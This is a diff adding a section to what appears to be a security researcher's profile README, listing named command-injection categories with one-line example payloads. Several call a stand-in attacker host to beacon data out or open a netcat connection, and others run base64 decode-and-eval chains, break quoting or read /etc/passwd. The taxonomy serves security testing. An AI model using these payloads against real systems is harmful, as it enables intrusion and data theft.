@@ -182,6 +182,45 @@ My notable public works are listed below. Private techniques/tools, still active
 
 ---
 
+### 🧬 Created Next-Gen Multi-Command Injection Fuzzing Techniques
+- **Comprehensive Injection Categories**  
+  - **Legacy**  
+    - *In-band*: direct output of commands (e.g. `id` → `uid=`)  
+    - *Time*: delay-based detection (e.g. `sleep 5`)  
+    - *DNSlog*: out-of-band via DNS beaconing (e.g. `curl http://<dnslog>/$(whoami)`)  
+  - **New Variants**  
+    - **XCI – eXtended Command Injection**  
+      Injects inside CLI flags or redirection chains (e.g. `--file=/tmp/$(id)`)  
+    - **RICI – Recursive Injection Command Invocation**  
+      Double-wrapped/evaluated payloads (e.g. `$(echo $(echo Y2F0IC9...|base64 -d) | sh)`)  
+    - **EFCI – Environmental Function Chain Injection**  
+      Leverages env vars & eval (e.g. `VAR="curl http://dns"; eval $VAR`)  
+    - **ICFI – Input-Controlled Flag Injection**  
+      Fakes legitimate flags (e.g. `--user $(ping -c1 attacker.com)`)  
+    - **HCI – Header-Controlled Injection**  
+      Payloads in HTTP headers (e.g. `User-Agent: $(id)`)  
+    - **CVCI – Chained Variable Command Injection**  
+      Complex chaining with `&&`, `||`, backticks (e.g. `cmd1 || $(cmd2) && $(cmd3)`)  
+    - **TPCI – Type-Punned Command Injection**  
+      Misleads type parsers (e.g. injecting into integers: `123;uname -a`)  
+    - **UDCI – Unicode-Disguised Command Injection**  
+      Obfuscates via Unicode escapes or RTL overrides (e.g. `\u0024\u007B\u0069\u0064\u007D`)  
+    - **PPCI – Polyglot Protocol Command Injection**  
+      Cross-protocol payloads (e.g. `curl http://127.0.0.1;nc attacker.com 4444`)  
+    - **FDI – File Descriptor Injection**  
+      Uses FD redirection (e.g. `2>&1; cat /etc/passwd`)  
+    - **QCI – Quoted Context Injection**  
+      Breaks quoting contexts (e.g. `';uname -a;'`)  
+    - **BPCI – Background Process Command Injection**  
+      Conceals payloads in background jobs (e.g. `ping -c1 attacker.com &`)  
+    - **MSCI – Multi-Stage Chained Injection**  
+      Sequential decode & execute (e.g. `eval $(base64 -d <<< ZWNobyAiaWQi)`)  
+    - **HSCI – Header-Script Command Injection**  
+      Embeds scripts in HTML headers/tags (e.g. `<meta http-equiv="refresh" content="0;url='.../;id'" />`)  
+    - **NSCI – Null-Space Command Injection**  
+      Exploits IFS or null bytes (e.g. `$(IFS=' ';echo whoami)`, `%00id`)  
+
+
 ### 🧬 Created Next-Gen Tools
 - Bandasbahen - A browser-oriented fuzzing engine designed to uncover 0-day vulnerabilities, including exploit paths similar to those used by Pegasus but you can also uncover exact paths using this script.
 - Noctua - A GPU-accelerated, AI-powered payload injector that renders and analyzes content in real time to discover cross-site scripting and rendering-based flaws across modern apps, APIs, and endpoints.
